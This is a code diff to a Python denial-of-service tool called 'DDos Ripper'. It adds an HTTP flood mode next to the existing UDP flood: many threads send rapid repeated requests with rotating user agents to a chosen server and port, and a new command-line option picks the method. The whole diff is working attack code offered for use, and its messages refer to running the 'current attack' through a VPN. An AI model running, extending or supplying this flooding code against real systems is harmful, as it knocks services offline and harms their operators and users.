@@ -1,5 +1,6 @@
 from optparse import OptionParser
 import time, sys, socket, threading, random, string
+import urllib.request
 
 
 def user_agent():
@@ -44,7 +45,7 @@ def get_random_port():
     return random.choice(ports)
 
 
-def down_it():
+def down_it_udp():
     i = 1
     while True:
         if random_packet_len:
@@ -77,6 +78,26 @@ def down_it():
         time.sleep(.01)
 
 
+def down_it_http():
+    while True:
+        try:
+            protocol = 'http://'
+            if port == 443:
+                protocol = 'https://'
+
+            url = f"{protocol}{host}:{port}"
+            urllib.request.urlopen(
+                urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
+            )
+        except:
+            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
+                  " Program will continue working.\033[0m")
+        else:
+            print('\033[92m HTTP-Request was done \033[0;0m')
+
+        time.sleep(.01)
+
+
 def usage():
     print(''' \033[0;95mDDos Ripper 
 
@@ -97,6 +118,7 @@ def get_parameters():
     global thr
     global item
     global random_packet_len
+    global attack_method
     optp = OptionParser(add_help_option=False, epilog="Rippers")
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
     optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
@@ -104,6 +126,8 @@ def get_parameters():
     optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
     optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                     help="Send random packets with random length")
+    optp.add_option("-m", "--method", type="str", dest="attack_method",
+                    help="Attack method: udp (default), http")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
@@ -125,6 +149,11 @@ def get_parameters():
         random_packet_len = True
     else:
         random_packet_len = False
+
+    if opts.attack_method and opts.attack_method in ['udp', 'http']:
+        attack_method = opts.attack_method
+    else:
+        attack_method = 'udp'
 
 
 def check_host():
@@ -167,7 +196,10 @@ if __name__ == '__main__':
 
     thrs = []
     for i in range(int(thr)):
-        thrs.append(threading.Thread(target=down_it))
+        if attack_method == 'udp':
+            thrs.append(threading.Thread(target=down_it_udp))
+        elif attack_method == 'http':
+            thrs.append(threading.Thread(target=down_it_http))
         thrs[i].daemon = True  # if thread is exist, it dies
         thrs[i].start()
 
